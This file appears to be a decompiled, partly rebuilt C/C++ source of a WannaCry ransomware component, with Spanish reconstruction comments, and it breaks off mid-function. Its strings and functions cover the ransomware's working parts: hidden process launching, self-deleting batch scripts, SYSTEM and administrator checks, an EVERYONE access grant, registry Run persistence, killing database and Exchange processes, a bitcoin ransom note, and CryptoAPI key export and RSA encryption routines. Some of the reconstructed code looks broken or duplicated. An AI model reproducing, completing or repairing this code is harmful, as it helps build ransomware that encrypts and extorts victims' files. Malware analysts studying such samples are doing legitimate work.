undefined *DAT_1000d944_ptr;
undefined DAT_1000cf40;
undefined DAT_1000d054;
undefined s_TESTDATA_1000d1a0;
undefined *DAT_1000d948_ptr;
undefined *DAT_1000d94c_ptr;
undefined DAT_10007210;
undefined DAT_10007220;
undefined DAT_10007230;
undefined *DAT_1000d950_ptr;
FARPROC DAT_1000d93c_far;
FARPROC DAT_1000d940_far;
FARPROC DAT_1000d944_far;
FARPROC DAT_1000d948_far;
FARPROC DAT_1000d94c_far;
FARPROC DAT_1000d950_far;
string s_CryptGenKey_1000d1ac;
string s_CryptDecrypt_1000d1b8;
string s_CryptEncrypt_1000d1c8;
string s_CryptDestroyKey_1000d1d8;
string s_CryptImportKey_1000d1e8;
string s_CryptAcquireContextA_1000d1f8;
undefined LAB_10006e98;
string s_08X_dky_1000d4e8;
undefined DAT_1000dd24;
int DAT_1000dd8c_int;
undefined DAT_1000d4f4;
string s_Global_MsWinZonesCacheCounterMut_1000d4fc;
string s_Global_MsWinZonesCacheCounterMut_1000d520;
unsigned int DAT_1000dc68;
undefined DAT_1000dcf0;
 unsigned int DAT_1000dd98_u1;
string s_cmd_exe_c_reg_add_s_v_s_t_1000d544;
string s_HKCU_SOFTWARE_Microsoft_Windows_1000d57c;
int DAT_1000dd94_int;
CHAR DAT_1000dd98_char;
string s_s_s_1000d5b0;
string s_taskse_exe_1000d5b8;
string s_WanaDecryptor_exe_1000d5c4;
string s_WanaDecryptor_exe_lnk_1000d60c;
unsigned char DAT_1000d624;
string s_echo_off_echo_SET_ow_WScript_1000d628;
string s_u_wnry_1000d704;
int DAT_1000d9d4;
undefined DAT_1000d9d0;
undefined *PTR_sprintf_10007158;
string s_1f_BTC_1000d70c;
string s_d_worth_of_bitcoin_1000d718;
undefined DAT_1000d730;
string s_r_wnry_1000d738;
string s_attrib_h_s_C_s_1000d748;
string s_RECYCLE_1000d75c;
unicode u_RECYCLE_1000d778;
unsigned int DAT_1000d7a4;
unsigned char DAT_1000d7a8;
undefined2 DAT_1000d918_u2;
undefined *PTR_GetDriveTypeW_100070c0;
undefined DAT_1000d4e4;
undefined LAB_10005340;
undefined LAB_10006ebb;
unsigned int DAT_1000dd8c_u4;
undefined FUN_10005680;
int DAT_1000dcc8;
int DAT_1000dce0;
undefined LAB_10006edb;
string s_f_wnry_1000d7bc;
string s_cmd_exe_c_start_b_s_vs_1000d7c8;
string s_s_co_1000d7e4;
string s_taskkill_exe_f_im_mysqld_exe_1000d7ec;
string s_taskkill_exe_f_im_sqlwriter_ex_1000d80c;
string s_taskkill_exe_f_im_sqlserver_ex_1000d830;
string s_taskkill_exe_f_im_MSExchange_1000d854;
string s_taskkill_exe_f_im_Microsoft_Ex_1000d874;
string s_s_fi_1000d8a0;
undefined DAT_1000d958;
unsigned int DAT_1000dd94_u4;
int DAT_1000dc70;
undefined DAT_10004790;
undefined LAB_10004990;
undefined LAB_10005300;
undefined LAB_10006efe;
string s_08X_eky_1000d8a8;
string s_08X_pky_1000d8b4;
string s_08X_res_1000d8c0;
undefined DAT_1000dd58;
undefined FUN_10005730;
undefined FUN_100045c0;
pointer PTR_FUN_1000acbc;
undefined DAT_10007a3c;
undefined DAT_10009c3c;
undefined DAT_1000a03c;
undefined DAT_1000a43c;
undefined DAT_1000a83c;
unsigned char DAT_1000ac3c;
undefined DAT_1000af00;
undefined DAT_1000d8d8;
undefined DAT_10007c3c;
undefined DAT_1000803c;
undefined DAT_1000843c;
undefined DAT_1000883c;
pointer PTR_DAT_1000d8cc;
unsigned int DAT_1000ac64;
unsigned int DAT_1000ac6c;
unsigned int DAT_1000ac74;
pointer PTR_DAT_1000d8d0;
int DAT_1000ddc0;
undefined *PTR__adjust_fdiv_100071cc;
undefined DAT_1000ddc4;
unsigned int *DAT_1000ddcc;
unsigned int *DAT_1000ddc8;
undefined DAT_1000c000;
undefined DAT_1000c004;
undefined *DAT_1000ddd0;

extern "C" {
    int __cdecl FUN_10001000(void* param_1, int param_2)
    {
        FILE* _File = nullptr;
        size_t sVar1;
        const char* _Mode;

        if (param_2 == 0) {
            _Mode = DAT_1000c018;
        }
        else {
            _Mode = DAT_1000c01c;
        }

        _File = fopen(s_c_wnry_1000c010, _Mode);
        if (_File != nullptr) {
            if (param_2 == 0) {
                sVar1 = fwrite(param_1, 0x30c, 1, _File);
            }
            else {
                sVar1 = fread(param_1, 0x30c, 1, _File);
            }
            
            fclose(_File);
            if (sVar1 != 0) {
                return 1;
            }
        }
        return 0;
    }
}

typedef int (__cdecl *DAT_1000d93c_fn)(DWORD, int, int, int, int);

extern "C" {
    extern DAT_1000d93c_fn DAT_1000d93c;
}

extern "C" BOOL __cdecl FUN_10001080(LPSTR param_1, DWORD param_2, LPDWORD param_3)
{
        BOOL BVar1;
        DWORD DVar2;
        PROCESS_INFORMATION local_54 = { 0 };
        STARTUPINFOA local_44 = { 0 };

        local_44.cb = sizeof(STARTUPINFOA);
        local_44.dwFlags = STARTF_USESHOWWINDOW;
        local_44.wShowWindow = SW_HIDE;

        BVar1 = CreateProcessA(
            nullptr,              // lpApplicationName
            param_1,              // lpCommandLine
            nullptr,              // lpProcessAttributes
            nullptr,              // lpThreadAttributes
            FALSE,                // bInheritHandles
            CREATE_NO_WINDOW,     // dwCreationFlags (0x08000000)
            nullptr,              // lpEnvironment
            nullptr,              // lpCurrentDirectory
            &local_44,            // lpStartupInfo
            &local_54             // lpProcessInformation
        );

        if (BVar1 != 0) {
            if (param_2 != 0) {
                DVar2 = WaitForSingleObject(local_54.hProcess, param_2);
                if (DVar2 != WAIT_OBJECT_0) {
                    TerminateProcess(local_54.hProcess, 0xFFFFFFFF);
                }
                if (param_3 != nullptr) {
                    GetExitCodeProcess(local_54.hProcess, param_3);
                }
            }
            CloseHandle(local_54.hProcess);
            CloseHandle(local_54.hThread);
            return TRUE;
        }
        return FALSE;
}



//extern "C" BOOL __cdecl FUN_10001080(LPSTR param_1, DWORD param_2, LPDWORD param_3);

extern "C" {
    void __cdecl FUN_10001140(char* param_1)
    {
        DWORD _Seed;
        unsigned int uVar1;
        int iVar2;
        FILE* _File = nullptr;
        time_t tVar3;
        char local_104[MAX_PATH];

        _Seed = GetTickCount();
        srand(_Seed);
        tVar3 = time(nullptr);
        uVar1 = static_cast<unsigned int>(tVar3);
        iVar2 = rand();

        // Genera el nombre del script batch ejecutable (ej: 1234_5678.bat)
        sprintf(local_104, s__d_d_bat_1000c034, iVar2, uVar1);

        _File = fopen(local_104, DAT_1000c030);
        if (_File == nullptr) {
            return;
        }

        // Escribe las instrucciones de ejecución y borrado automático en el batch
        fprintf(_File, s__s_del__a___0_1000c020, param_1, param_1);
        fclose(_File);

        // Ejecuta el archivo script mediante la función reconstruida previa
        FUN_10001080(local_104, 0, nullptr);
        return;
    }
}



extern "C" {
    int __cdecl FUN_100011d0(void)
    {
        HANDLE hProcess = nullptr;
        BOOL bSuccess = FALSE;
        PVOID pTokenInformation = nullptr;
        HMODULE hModule = nullptr;
        int iResult = 0;
        DWORD dwLengthNeeded = 0;
        HANDLE hToken = nullptr;
        wchar_t* local_c = nullptr;
        wchar_t* local_4 = nullptr;

        hProcess = GetCurrentProcess();
        bSuccess = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
        if (!bSuccess) {
            return 0;
        }

        // Obtener el tamaño necesario para la información del token
        bSuccess = GetTokenInformation(hToken, static_cast<TOKEN_INFORMATION_CLASS>(TokenUser), nullptr, 0, &dwLengthNeeded);
        if (!bSuccess) {
            if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
                CloseHandle(hToken);
                return 0;
            }
        }

        pTokenInformation = GlobalAlloc(GPTR, dwLengthNeeded);
        if (pTokenInformation == nullptr) {
            CloseHandle(hToken);
            return 0;
        }

        bSuccess = GetTokenInformation(hToken, static_cast<TOKEN_INFORMATION_CLASS>(TokenUser), nullptr, 0, &dwLengthNeeded);
        if (!bSuccess) {
            GlobalFree(pTokenInformation);
            CloseHandle(hToken);
            return 0;
        }

        hModule = reinterpret_cast<HMODULE>(LoadLibraryA(s_advapi32_dll_1000c058));
        if (hModule == nullptr) {
            GlobalFree(pTokenInformation);
            CloseHandle(hToken);
            return 0;
        }

        // 5. Cargar librería dinámicamente usando ::HMODULE explícito para evitar redeclaraciones/conflictos
        hModule = reinterpret_cast<HMODULE>(LoadLibraryA(s_advapi32_dll_1000c058));
        if (hModule == nullptr) {
            GlobalFree(pTokenInformation);
            CloseHandle(hToken);
            return 0;
        }

        // Llamada a ConvertSidToStringSidW dinámicamente mediante casteo explícito de función
        typedef BOOL (WINAPI *pfnConvertSidToStringSidW)(PSID, LPWSTR*);
        pfnConvertSidToStringSidW pConvertSidToStringSid =
    (pfnConvertSidToStringSidW)::GetProcAddress(hModule, "ConvertSidToStringSidW");
        if (pConvertSidToStringSid == nullptr) {
          GlobalFree(pTokenInformation);
          CloseHandle(hToken);
          return 0;
        }

        local_4 = nullptr;
        // pTokenInformation apunta a TOKEN_USER, cuyo primer miembro es la estructura SID_AND_ATTRIBUTES (PSID)
        iResult = pConvertSidToStringSid(*(PSID*)pTokenInformation, &local_4);
        if (iResult == 0) {
            GlobalFree(pTokenInformation);
            CloseHandle(hToken);
            return 0;
        }

        if (local_4 != nullptr && local_c != nullptr) {
            wcscpy(local_c, local_4);
        }

        if (pTokenInformation != nullptr) {
            GlobalFree(pTokenInformation);
        }

        CloseHandle(hToken);
        return 1;
    }
}



// Declaración previa de FUN_100011d0 si no está en un header separado
extern "C" int __cdecl FUN_100011d0(void);

extern "C" {
    int __cdecl FUN_100012d0(void)
    {
        int iVar1;
        const WCHAR* _Str1 = nullptr;
        const WCHAR* _Str2 = nullptr;
        DWORD local_25c = 0;
        WCHAR local_258[300] = { 0 }; // Búfer para el nombre de usuario de Windows

        iVar1 = FUN_100011d0();
        if (iVar1 == 0) {
            local_25c = sizeof(local_258) / sizeof(WCHAR);
            if (GetUserNameW(local_258, &local_25c)) {
                _Str1 = local_258;
                _Str2 = u_SYSTEM_1000c068;
            } else {
                return 0;
            }
        }
        else {
            _Str2 = local_258;
            _Str1 = u_S_1_5_18_1000c078;
        }

        iVar1 = _wcsicmp(_Str1, _Str2);
        if (iVar1 == 0) {
            return 1;
        }
        return 0;
    }
}



extern "C" {
    BOOL __cdecl FUN_10001360(void)
    {
        BOOL BVar1;
        BOOL local_10 = FALSE;
        PSID local_c = nullptr;
        
        // Uso explícito de SID_IDENTIFIER_AUTHORITY del SDK nativo de Windows
        SID_IDENTIFIER_AUTHORITY local_8 = SECURITY_NT_AUTHORITY; // {0,0,0,0,0,5}

        // AllocateAndInitializeSid con casteo explícito (PSID_IDENTIFIER_AUTHORITY)
        BVar1 = AllocateAndInitializeSid(
            &local_8, 
            2, 
            SECURITY_BUILTIN_DOMAIN_RID, // 0x20
            DOMAIN_ALIAS_RID_ADMINS,     // 0x220
            0, 0, 0, 0, 0, 0, 
            &local_c
        );

        if (BVar1 == 0) {
            return FALSE;
        }

        // Verifica si el token del proceso pertenece al grupo de Administradores
        BVar1 = CheckTokenMembership(nullptr, local_c, &local_10);
        if (BVar1 == 0) {
            local_10 = FALSE;
        }

        FreeSid(local_c);
        return local_10;
    }
}



void __cdecl FUN_100013e0(HANDLE param_1)

{
  int iVar1;
  _EXPLICIT_ACCESS_A *p_Var2;
  PACL local_2c;
  PACL local_28;
  PSECURITY_DESCRIPTOR local_24;
  _EXPLICIT_ACCESS_A local_20;
  
  local_2c = (PACL)0x0;
  local_28 = (PACL)0x0;
  local_24 = (HLOCAL)0x0;
  GetSecurityInfo(param_1,SE_KERNEL_OBJECT,4,(PSID *)0x0,(PSID *)0x0,
                  reinterpret_cast<PACL *>(&local_2c),(PACL *)0x0,&local_24);
  p_Var2 = &local_20;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    p_Var2->grfAccessPermissions = 0;
    p_Var2 = (_EXPLICIT_ACCESS_A *)&p_Var2->grfAccessMode;
  }
  local_20.grfAccessPermissions = 0x1f0001;
  local_20.grfAccessMode = static_cast<ACCESS_MODE>(GRANT_ACCESS);
  local_20.grfInheritance = 0;
  local_20.Trustee.pMultipleTrustee = nullptr;
  local_20.Trustee.MultipleTrusteeOperation =
      static_cast<MULTIPLE_TRUSTEE_OPERATION>(NO_MULTIPLE_TRUSTEE);
  local_20.Trustee.TrusteeForm = static_cast<TRUSTEE_FORM>(TRUSTEE_IS_NAME);
  local_20.Trustee.TrusteeType = static_cast<TRUSTEE_TYPE>(TRUSTEE_IS_WELL_KNOWN_GROUP);
  local_20.Trustee.ptstrName = s_EVERYONE_1000c08c;
  SetEntriesInAclA(
    1, 
    static_cast<PEXPLICIT_ACCESS_A>(static_cast<void*>(&local_20)), 
    local_2c, 
    &local_28
);
  SetSecurityInfo(param_1,SE_KERNEL_OBJECT,4,(PSID)0x0,(PSID)0x0,local_28,(PACL)0x0);
  LocalFree(local_2c);
  LocalFree(local_28);
  LocalFree(local_24);
  return;
}



char *__cdecl FUN_100014a0(char *param_1)

{
  WCHAR WVar1;
  size_t sVar2;
  int iVar3;
  int iVar4;
  WCHAR *pWVar5;
  unsigned int uVar6;
  DWORD *puVar7;
  unsigned int uVar8;
  DWORD local_194;
  WCHAR local_190;
  DWORD local_18e [99];
  
  local_190 = DAT_1000d918;
  puVar7 = local_18e;
  for (iVar4 = 99; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  local_194 = 399;
  *(undefined2 *)puVar7 = 0;
  GetComputerNameW(&local_190,&local_194);
  uVar6 = 1;
  uVar8 = 0;
  sVar2 = wcslen(&local_190);
  if (sVar2 != 0) {
    pWVar5 = &local_190;
    do {
      WVar1 = *pWVar5;
      pWVar5 = pWVar5 + 1;
      uVar6 = uVar6 * (ushort)WVar1;
      uVar8 = uVar8 + 1;
      sVar2 = wcslen(&local_190);
    } while (uVar8 < sVar2);
  }
  srand(uVar6);
  uVar6 = rand();
  uVar6 = uVar6 & 0x80000007;
  if ((int)uVar6 < 0) {
    uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;
  }
  iVar4 = 0;
  if (0 < (int)(uVar6 + 8)) {
    do {
      iVar3 = rand();
      param_1[iVar4] = (char)(iVar3 % 0x1a) + 'a';
      iVar4 = iVar4 + 1;
    } while (iVar4 < (int)(uVar6 + 8));
  }
  for (; iVar4 < (int)(uVar6 + 0xb); iVar4 = iVar4 + 1) {
    iVar3 = rand();
    param_1[iVar4] = (char)(iVar3 % 10) + '0';
  }
  param_1[iVar4] = '\0';
  return param_1;
}

using std::uint32_t;
using std::uint8_t;
using std::uintptr_t;

extern "C" {

void FUN_10003a10(DWORD* p);
void FUN_10005d80(DWORD* p);

extern const uintptr_t PTR_FUN_100071f8;

// Eliminamos la declaración duplicada de la línea 1538 
// y quitamos el extern "C" anidado de la línea 1547:
DWORD* __fastcall FUN_10001590(DWORD* param_1) {
    if (param_1 == nullptr) {
        return nullptr;
    }

        // Llamadas de inicialización interna de sub-objetos / estructuras
        FUN_10003a10(param_1 + 1);
        FUN_10003a10(param_1 + 0xB);
        FUN_10005d80(param_1 + 0x15);

        // Limpieza / inicialización de campos del objeto
        param_1[0x132] = 0;
        param_1[0x133] = 0;
        param_1[0x134] = 0;
        param_1[0x135] = 0;

        // Reserva de memoria dinámicamente de 0x18 (24) bytes
        uint8_t* pvVar1 = new (std::nothrow) uint8_t[0x18];
        if (pvVar1 != nullptr) {
            *reinterpret_cast<void**>(pvVar1) = pvVar1;
            *reinterpret_cast<void**>(pvVar1 + 4) = pvVar1;
        }

        // Asignación del búfer creado e inicialización de offsets adicionales
        param_1[0x139] = static_cast<std::uint32_t>(reinterpret_cast<std::uintptr_t>(pvVar1));
        param_1[0x13A] = 0;
        param_1[0x136] = 0;

        *reinterpret_cast<uint16_t*>(reinterpret_cast<uint8_t*>(param_1) + 0x141) = 0;
        *reinterpret_cast<uint16_t*>(reinterpret_cast<uint8_t*>(param_1) + 0x1C3) = 0;

        param_1[0x245] = 0;
        param_1[0x137] = 0;
        param_1[0x246] = 0;
        param_1[0x247] = 0;
        param_1[0x248] = 0;

        // Asignación de la Vtable (Virtual Method Table) al inicio del objeto
        *param_1 = static_cast<std::uint32_t>(reinterpret_cast<std::uintptr_t>(&PTR_FUN_100071f8));

        return param_1;
    }
}


// Declaración previa de la función de destrucción interna
extern "C" void __fastcall FUN_10001680(std::uint32_t* pThis);

extern "C" {
    // Se renombra el parámetro 'this' a 'pThis' para evitar el conflicto con la palabra reservada de C++
    void* __cdecl FUN_10001660(void* pThis, uint8_t param_1)
    {
        if (pThis == nullptr) {
            return nullptr;
        }

        // 1. Llama al destructor de la clase/estructura para liberar sus recursos internos
        FUN_10001680(static_cast<DWORD*>(pThis));

        // 2. Si el primer bit del flag (param_1 & 1) está encendido, libera el bloque de memoria del objeto
        if ((param_1 & 1) != 0) {
            ::operator delete(pThis);
        }

        return pThis;
    }
}

extern "C" {
    void __fastcall FUN_10005db0(DWORD* param_1)
    {
        *param_1 = static_cast<std::uint32_t>(
            reinterpret_cast<std::uintptr_t>(&PTR_FUN_1000acbc));
    }
}

extern "C" {

  void __fastcall FUN_10003a60(DWORD *param_1)

{
  *param_1 = static_cast<DWORD>(reinterpret_cast<uintptr_t>(&PTR_FUN_1000720c));
  DeleteCriticalSection(reinterpret_cast<CRITICAL_SECTION*>(param_1 + 4));
  return;
}

void __fastcall FUN_10001680(DWORD* param_1)
{
    DWORD* piVar1;
    DWORD* piVar2;
    DWORD* piVar3;
    void* local_c;
    uint8_t* puStack_8;
    int32_t local_4;

    puStack_8 = const_cast<uint8_t*>(&LAB_10006def);
    local_c = ExceptionList;
    ExceptionList = &local_c;

    *param_1 = static_cast<unsigned int>(reinterpret_cast<uintptr_t>(&PTR_FUN_100071f8));
    local_4 = 3;

    FUN_10001760(static_cast<unsigned int>(reinterpret_cast<uintptr_t>(param_1)));

    piVar1 = reinterpret_cast<DWORD*>(static_cast<uintptr_t>(param_1[0x139]));
    local_4 = 2;

    piVar3 = reinterpret_cast<DWORD*>(static_cast<uintptr_t>(*piVar1));

    while (piVar3 != piVar1) {
        piVar2 = reinterpret_cast<DWORD*>(static_cast<uintptr_t>(*piVar3));

        *reinterpret_cast<DWORD*>(piVar3[1]) = *piVar3;
        *reinterpret_cast<DWORD*>(*piVar3 + 4) = piVar3[1];

        // Destrucción de la cadena en el desplazamiento del nodo
        reinterpret_cast<std::string*>(piVar3 + 2)->~basic_string();

        // Liberación de memoria con delete operator estándar
        ::operator delete(piVar3);

        param_1[0x13A] = param_1[0x13A] - 1;
        piVar3 = piVar2;
    }

    ::operator delete(reinterpret_cast<void*>(static_cast<uintptr_t>(param_1[0x139])));

    param_1[0x139] = 0;
    param_1[0x13A] = 0;

    local_4 = 1;
    FUN_10005db0(param_1 + 0x15);

    local_4 = 0;
    FUN_10003a60(param_1 + 0x0B);

    local_4 = -1; // Equivale a 0xFFFFFFFF
    FUN_10003a60(param_1 + 1);

    ExceptionList = local_c;
}

} // extern "C"

// Definición de __fastcall para GCC en x86
#ifndef __fastcall
    #if defined(__i386__) || defined(_M_IX86)
        #define __fastcall __attribute__((fastcall))
    #else
        #define __fastcall
    #endif
#endif

typedef void (__cdecl *DAT_1000d944_fn)(int);

extern "C" {
    extern DAT_1000d944_fn DAT_1000d944;
}

extern "C" {

  DWORD __fastcall FUN_10003bb0(DWORD param_1)

{
  if (*(int *)(param_1 + 8) != 0) {
    (*DAT_1000d944)(*(int *)(param_1 + 8));
    *(DWORD *)(param_1 + 8) = 0;
  }
  if (*(int *)(param_1 + 0xc) != 0) {
    (*DAT_1000d944)(*(int *)(param_1 + 0xc));
    *(DWORD *)(param_1 + 0xc) = 0;
  }
  if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
    CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
    *(DWORD *)(param_1 + 4) = 0;
  }
  return 1;
}

DWORD __fastcall FUN_10001760(uintptr_t param_1)
{
    unsigned char* puVar1;
    size_t sVar2;
    int iVar3;

    // Aritmética de direcciones en bytes
    FUN_10003bb0((DWORD)(param_1 + 4));
FUN_10003bb0((DWORD)(param_1 + 0x2C));

    // Primer búfer a limpiar con GlobalFree
    puVar1 = *reinterpret_cast<unsigned char**>(param_1 + 0x4C8);
    if (puVar1 != nullptr) {
        iVar3 = 0x100000;
        do {
            *puVar1 = 0;
            puVar1 = puVar1 + 1;
            iVar3 = iVar3 - 1;
        } while (iVar3 != 0);

        GlobalFree(*reinterpret_cast<HGLOBAL*>(param_1 + 0x4C8));
        *reinterpret_cast<DWORD*>(param_1 + 0x4C8) = 0;
    }

    // Segundo búfer a limpiar con GlobalFree
    puVar1 = *reinterpret_cast<unsigned char**>(param_1 + 0x4CC);
    if (puVar1 != nullptr) {
        iVar3 = 0x100000;
        do {
            *puVar1 = 0;
            puVar1 = puVar1 + 1;
            iVar3 = iVar3 - 1;
        } while (iVar3 != 0);

        GlobalFree(*reinterpret_cast<HGLOBAL*>(param_1 + 0x4CC));
        *reinterpret_cast<DWORD*>(param_1 + 0x4CC) = 0;
    }

    // Manejo de sincronización y cierre de Thread/HANDLE
    if (*reinterpret_cast<HANDLE*>(param_1 + 0x4D8) != NULL) {
        *reinterpret_cast<DWORD*>(param_1 + 0x4DC) = 1;

        WaitForSingleObject(*reinterpret_cast<HANDLE*>(param_1 + 0x4D8), 0xFFFFFFFF);

        if (DAT_1000d934 != nullptr) {
            DAT_1000d934(*reinterpret_cast<DWORD*>(param_1 + 0x4D8));
        }

        *reinterpret_cast<DWORD*>(param_1 + 0x4D8) = 0;
    }

    // Eliminación de sección crítica de Windows
    DeleteCriticalSection(reinterpret_cast<LPCRITICAL_SECTION>(param_1 + 0x4EC));

    // Comprobación y liberación de la cadena Unicode (wchar_t)
    sVar2 = wcslen(reinterpret_cast<wchar_t*>(param_1 + 0x70C));
    if (sVar2 != 0) {
        if (DAT_1000d930 != nullptr) {
            DAT_1000d930(reinterpret_cast<wchar_t*>(param_1 + 0x70C));
        }
    }

    return 1;
}

} // extern "C"

extern "C" void __cdecl _local_unwind2(void* frame, int target_level) {
    // Stub para compatibilidad de descompilación SEH
}

DWORD __cdecl FUN_10004040(DWORD param_1,HCRYPTKEY param_2,DWORD param_3,LPCSTR param_4)

{
  BOOL BVar1;
  BYTE *pbData;
  HANDLE hFile;
  DWORD local_28;
  BYTE *local_24;
  DWORD local_20 [3];
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  DWORD local_8;
  
  puStack_c = &DAT_10007230;
  puStack_10 = &DAT_10006bb6;
  local_14 = ExceptionList;
  local_28 = 0;
  local_20[0] = 0;
  local_24 = (BYTE *)0x0;
  local_8 = 0;
  ExceptionList = &local_14;
  BVar1 = CryptExportKey(param_2,0,param_3,0,(BYTE *)0x0,&local_28);
  if ((((BVar1 != 0) && (pbData = (BYTE *)GlobalAlloc(0,local_28), local_24 = pbData, pbData != (BYTE *)0x0)
       ) && (BVar1 = CryptExportKey(param_2,0,param_3,0,pbData,&local_28), BVar1 != 0)) &&
    ((hFile = CreateFileA(param_4,0x40000000,0,nullptr,2,0x80,(HANDLE)0x0),
      hFile != (HANDLE)0xffffffff &&
      (BVar1 = WriteFile(hFile,pbData,local_28,local_20,nullptr), BVar1 != 0)))) {
    local_unwind2(&local_14,0xffffffff);
    ExceptionList = local_14;
    return 1;
  }
  local_unwind2(&local_14,0xffffffff);
  ExceptionList = local_14;
  return 0;
}

DWORD __fastcall FUN_10003a80(DWORD param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  do {
    iVar1 = (*DAT_1000d93c)(param_1 + 4,0,-(uint)(iVar2 != 0) & 0x1000d168,0x18,0xf0000000);
    if (iVar1 != 0) {
      return 1;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 2);
  return 0;
}

typedef int (__cdecl *DAT_1000d940_t)(DWORD, HGLOBAL, DWORD, int, int, DWORD);
extern DAT_1000d940_t DAT_1000d940;

DWORD __cdecl FUN_10003f00(DWORD param_1,DWORD param_2,LPCSTR param_3)

{
  HANDLE hFile;
  DWORD dwBytes;
  HGLOBAL lpBuffer;
  BOOL BVar1;
  int iVar2;
  DWORD local_20 [3];
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  DWORD local_8;
  
  puStack_c = &DAT_10007220;
  puStack_10 = &DAT_10006bb6;
  local_14 = ExceptionList;
  local_20[0] = 0;
  local_8 = 0;
  ExceptionList = &local_14;
  hFile = CreateFileA(param_3,0x80000000,1,0,3,0,(HANDLE)0x0);
  if ((((hFile != (HANDLE)0xffffffff) &&
       (dwBytes = GetFileSize(hFile,(LPDWORD)0x0), dwBytes != 0xffffffff)) && (dwBytes < 0x19001))
     && (((lpBuffer = GlobalAlloc(0,dwBytes), lpBuffer != (HGLOBAL)0x0 &&
          (BVar1 = ReadFile(hFile,lpBuffer,dwBytes,local_20,0), BVar1 != 0)) &&
         (iVar2 = (*DAT_1000d940)(param_1,lpBuffer,local_20[0],0,0,param_2), iVar2 != 0)))) {
    local_unwind2(&local_14,0xffffffff);
    ExceptionList = local_14;
    return 1;
  }
  local_unwind2(&local_14,0xffffffff);
  ExceptionList = local_14;
  return 0;
}

void __thiscall FUN_10003c00(void *this_ptr,LPCSTR param_1)

{
  if (*(int *)((int)this_ptr + 8) != 0) {
    (*DAT_1000d944)(*(int *)((int)this_ptr + 8));
    *(int *)((int)this_ptr + 8) = 0;
  }
  FUN_10003f00(*(int *)((int)this_ptr + 4), *(int *)((int)this_ptr + 8), param_1);
  return;
}

typedef int (__cdecl *DAT_1000d950_t)(DWORD, int, uintptr_t, DWORD);
extern DAT_1000d950_t DAT_1000d950;

bool __cdecl FUN_10004350(DWORD param_1,DWORD param_2)

{
  int iVar1;
  
  iVar1 = (*DAT_1000d950)(param_1,1,0x8000001,param_2);
  return iVar1 != 0;
}

// WARNING: Unable to track spacebase fully for stack

void FUN_10006bd0(void)
{
    uint in_EAX = 0;
    uint8_t *puVar1;
    DWORD unaff_retaddr = 0;

    puVar1 = reinterpret_cast<uint8_t*>(&unaff_retaddr);

    for (; 0xfff < in_EAX; in_EAX = in_EAX - 0x1000) {
        puVar1 = puVar1 - 0x1000;
    }
    
    *reinterpret_cast<undefined4*>(puVar1 + (-4 - static_cast<int>(in_EAX))) = unaff_retaddr;
    return;
}

DWORD * FUN_10004170(void)

{
  uint uVar1;
  BOOL BVar2;
  undefined1 *puVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  DWORD *puVar8;
  DWORD *puVar9;
  uint uStack00000004;
  DWORD *puStack00000008;
  DWORD *puStack0000000c;
  uint uStack00000010;
  HCRYPTKEY in_stack_0000201c;
  HCRYPTKEY in_stack_00002020;
  DWORD in_stack_00002024;
  DWORD *in_stack_00002028;
  BYTE stack0x00000014[0x1000]; // Búfer dinámico/pila de 4096 bytes usado por CryptExportKey
BYTE stack0x00001014[0x1000];
  
  FUN_10006bd0();
  uStack00000010 = 0;
  *in_stack_00002028 = 0x1000;
  BVar2 = CryptExportKey(in_stack_0000201c, 0, in_stack_00002024, 0, stack0x00000014, in_stack_00002028);
  ;
  if (BVar2 == 0) {
      return (DWORD *)0x0;
  }
  BVar2 = CryptGetKeyParam(in_stack_00002020, 8, reinterpret_cast<BYTE*>(&uStack00000010), reinterpret_cast<DWORD*>(&in_stack_00002024), 0);
  ;
  if (BVar2 != 0) {
    uVar7 = uStack00000010 >> 3;
    uVar6 = (*in_stack_00002028 - 1) / (uVar7 - 0xb) + 1;
    *in_stack_00002028 = uVar6 * uVar7;
puStack0000000c = static_cast<DWORD*>(GlobalAlloc(0, uVar6 * uVar7));
    if (puStack0000000c == (DWORD *)0x0) {
      puVar3 = &stack0x00000014;
      iVar4 = 0x1000;
      do {
        *puVar3 = 0;
        puVar3 = puVar3 + 1;
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
      return (DWORD *)0x0;
    }
    uStack00000004 = 0;
    puStack00000008 = puStack0000000c;
    if (uVar6 != 0) {
      do {
        uVar1 = uVar7 - 0xb;
        puVar3 = &stack0x00001014;
        iVar4 = 0x1000;
        do {
          *puVar3 = 0;
          puVar3 = puVar3 + 1;
          iVar4 = iVar4 + -1;
        } while (iVar4 != 0);
        puVar8 = (DWORD *)(&stack0x00000014 + uStack00000004 * uVar1);
        puVar9 = (DWORD *)&stack0x00001014;
        for (uVar5 = uVar1 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
          *puVar9 = *puVar8;
          puVar8 = puVar8 + 1;
          puVar9 = puVar9 + 1;
        }
        for (uVar5 = uVar1 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
          *(uint8_t *)puVar9 = *(uint8_t *)puVar8;
          puVar8 = (DWORD *)((int)puVar8 + 1);
          puVar9 = (DWORD *)((int)puVar9 + 1);
        }
        iVar4 = (*DAT_1000d948)(
    0,                                  // arg1 (DWORD)
    1,                                  // arg2 (int)
    0,                                  // arg3 (int)
    0,                                  // arg4 (int)
    stack0x00000014,                    // arg5 (BYTE* / Buffer)
    in_stack_00002028                   // arg6 (DWORD* / Tamaño)
);
        if (iVar4 == 0) {
          GlobalFree(puStack0000000c);
          puVar3 = &stack0x00000014;
          iVar4 = 0x1000;
          do {
            *puVar3 = 0;
            puVar3 = puVar3 + 1;
            iVar4 = iVar4 + -1;
          } while (iVar4 != 0);
          return (DWORD *)0x0;
        }
        puVar8 = (DWORD *)&stack0x00001014;
        puVar9 = puStack00000008;
        for (uVar5 = uVar1 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
          *puVar9 = *puVar8;
          puVar8 = puVar8 + 1;
          puVar9 = puVar9 + 1;
        }
